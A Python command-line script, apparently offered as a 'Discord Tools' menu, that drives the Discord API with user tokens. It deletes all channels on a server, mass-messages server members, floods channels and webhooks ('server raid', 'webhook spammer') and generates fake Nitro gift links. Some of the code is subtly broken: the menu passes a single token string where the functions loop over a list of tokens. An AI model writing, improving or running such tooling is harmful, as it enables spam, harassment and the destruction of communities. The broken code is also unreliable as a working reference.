import requests
import random
import string
import time
from rich.console import Console
import os

os.system("mode con: cols=144 lines=51")

console = Console()
def delete_all_channels(token, server_id):
    headers = {"Authorization": token}
    channels_response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/channels", headers=headers)
    if channels_response.status_code != 200:
        return f"[red]Failed to fetch channels for server {server_id}.[/red]"
    channels = channels_response.json()
    for channel in channels:
        try:
            delete_response = requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers)
            if delete_response.status_code == 204:
                console.print(f"[green]Channel {channel['name']} deleted successfully.[/green]")
            else:
                console.print(f"[yellow]Failed to delete channel {channel['name']}.[/yellow]")
            time.sleep(1)  
        except Exception as e:
            console.print(f"[red]Error deleting channel {channel['name']}: {str(e)}[/red]")
    return "[blue]All channels deletion completed.[/blue]"
def mass_dm(tokens, server_id, message):
    for token in tokens:
        url = f"https://discord.com/api/v9/users/@me/channels"
        headers = {"Authorization": token}
        response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/members?limit=1000", headers=headers)
        if response.status_code != 200:
            console.print(f"[red]Failed to fetch members for token {token}.[/red]")
            continue
        members = response.json()
        for member in members:
            try:
                user_id = member['user']['id']
                dm_response = requests.post(url, headers=headers, json={"recipient_id": user_id})
                if dm_response.status_code == 200:
                    dm_channel = dm_response.json()
                    dm_channel_id = dm_channel['id']
                    requests.post(f"https://discord.com/api/v9/channels/{dm_channel_id}/messages", 
                                  headers=headers, json={"content": message})
                time.sleep(1)  
            except Exception as e:
                console.print(f"[red]Error messaging {user_id} with token {token}: {str(e)}[/red]")
    return "[blue]Mass DM completed for all tokens.[/blue]"
def mass_change_status(tokens, status_message):
    for token in tokens:
        headers = {"Authorization": token, "Content-Type": "application/json"}
        data = {"custom_status": {"text": status_message}}
        response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=data)
        if response.status_code == 200:
            console.print(f"Status changed successfully for token {token}.")
        else:
            console.print(f"Failed to change status for token {token}.")
def server_raid(token, channel_id, message):
    headers = {"Authorization": token}
    for _ in range(10):  
        requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", 
                      headers=headers, json={"content": message})
        time.sleep(0.5)  
    return "Server raid completed."
def webhook_spammer(webhook_url, message):
    for _ in range(10): 
        requests.post(webhook_url, json={"content": message})
        time.sleep(0.5)
    return "Webhook spam completed."
def generate_nitro_code():
    return "https://discord.gift/" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
def get_token_info(token):
    headers = {"Authorization": token}
    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        return "Failed to fetch token information."
def delete_webhook(webhook_url):
    response = requests.delete(webhook_url)
    if response.status_code == 204:
        return "Webhook deleted successfully."
    else:
        return "Failed to delete webhook."
def create_webhook(token, channel_id, webhook_name):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    data = {"name": webhook_name}
    response = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", headers=headers, json=data)
    if response.status_code == 200:
        return response.json()["url"]
    else:
        return "Failed to create webhook."
def send_message(token, channel_id, message):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    data = {"content": message}
    response = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=data)
    if response.status_code == 200:
        return "Message sent successfully."
    else:
        return "Failed to send message."
from termcolor import colored

def display_menu():

    print(colored("""
                     
                                ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
                               ▐░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
                               ▐░█▀▀▀▀▀▀▀█░▌▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
                               ▐░▌       ▐░▌    ▐░▌     ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
                               ▐░▌       ▐░▌    ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌
                               ▐░▌       ▐░▌    ▐░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
                               ▐░▌       ▐░▌    ▐░▌      ▀▀▀▀▀▀▀▀▀█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▀▀▀▀█░█▀▀ ▐░▌       ▐░▌
                               ▐░▌       ▐░▌    ▐░▌               ▐░▌▐░░░░░░░░░░░▌▐░▌     ▐░▌  ▐░▌       ▐░▌
                               ▐░█▄▄▄▄▄▄▄█░▌▄▄▄▄█░█▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌ ▀▀▀▀▀▀█░█▀▀ ▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄█░▌
                               ▐░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌        ▐░▌  ▐░▌       ▐░▌▐░░░░░░░░░░▌ 
                                ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀          ▀    ▀         ▀  ▀▀▀▀▀▀▀▀▀▀  
             """, "blue"))                                                                           
    print(colored("""
           ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
           ‖                                                 DISCORD TOOLS MENU                                                 ‖
           ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
           """, "yellow"))
    print(colored("""
           ╔═══════════════════════════════════╗    ╔═══════════════════════════════════╗    ╔══════════════════════════════════╗
           ‖ (1) Discord Token Info            ‖    ‖ (4) Discord Token Status Changer  ‖    ‖ (7) Discord Webhook Spammer      ‖ 
           ‖                                   ‖    ‖                                   ‖    ‖                                  ‖ 
           ‖ (2) Discord Webhook Delete        ‖    ‖ (5) Discord Token Mass DM         ‖    ‖ (8) Discord Nitro Generator      ‖ 
           ‖                                   ‖    ‖                                   ‖    ‖                                  ‖ 
           ‖ (3) Discord Webhook Generator     ‖    ‖ (6) Discord Server Raid           ‖    ‖ (9) Send Message to Channel      ‖ 
           ╚═══════════════════════════════════╝    ╚═══════════════════════════════════╝    ╚══════════════════════════════════╝
                                                    
           ╔═══════════════════════════════════╗    ╔═══════════════════════════════════╗    ╔══════════════════════════════════╗ 
           ‖                                   ‖    ‖ (10) Mass Token Management        ‖    ‖                                  ‖
           ‖            VERSION: 1.0           ‖    ‖                                   ‖    ‖       RELEASE: 12.10.24          ‖
           ‖                                   ‖    ‖ (11) Delete All Channels on Server‖    ‖                                  ‖
           ╚═══════════════════════════════════╝    ‖                                   ‖    ╚══════════════════════════════════╝                                 
                                                    ‖ (12) Exit                         ‖                                                                        
                                                    ╚═══════════════════════════════════╝    
           """, "blue")) 
    print(colored("""      
           ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
           ‖                           coded by: @RigOlit                            chanle"@Rigolit22                          ‖
           ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
           """, "yellow"))

def main_menu():
    while True:
        display_menu()
        
        choice = input("Select an option (1-12): ")

        if choice == '12': 
            break
        elif choice == '1': 
            token = input("Enter the Discord token: ")
            result = get_token_info(token)
            print(result)
        elif choice == '2':  
            webhook_url = input("Enter the webhook URL: ")
            result = delete_webhook(webhook_url)
            print(result)
        elif choice == '3':  
            token = input("Enter the Discord token: ")
            channel_id = input("Enter the channel ID: ")
            webhook_name = input("Enter the webhook name: ")
            result = create_webhook(token, channel_id, webhook_name)
            print(f"Webhook URL: {result}")
        elif choice == '4': 
            token = input("Enter the Discord token: ")
            status_message = input("Enter the status message: ")
            result = mass_change_status(token, status_message)
            print(result)
        elif choice == '5':  
            token = input("Enter the Discord token: ")
            server_id = input("Enter the server ID: ")
            message = input("Enter the message to send: ")
            result = mass_dm(token, server_id, message)
            print(result)
        elif choice == '6':  
            token = input("Enter the Discord token: ")
            channel_id = input("Enter the channel ID: ")
            message = input("Enter the message: ")
            result = server_raid(token, channel_id, message)
            print(result)
        elif choice == '7':  
            webhook_url = input("Enter the webhook URL: ")
            message = input("Enter the message: ")
            result = webhook_spammer(webhook_url, message)
            print(result)
        elif choice == '8': 
            nitro_code = generate_nitro_code()
            print(f"Generated Nitro Code: {nitro_code}")
        elif choice == '9': 
            token = input("Enter the Discord token: ")
            channel_id = input("Enter the channel ID: ")
            message = input("Enter the message to send: ")
            result = send_message(token, channel_id, message)
            print(result)
        elif choice == '10': 
            pass
        elif choice == '11':  
            token = input("Enter the Discord token: ")
            server_id = input("Enter the server ID: ")
            result = delete_all_channels(token, server_id)
            print(result)

if __name__ == "__main__":
    main_menu()
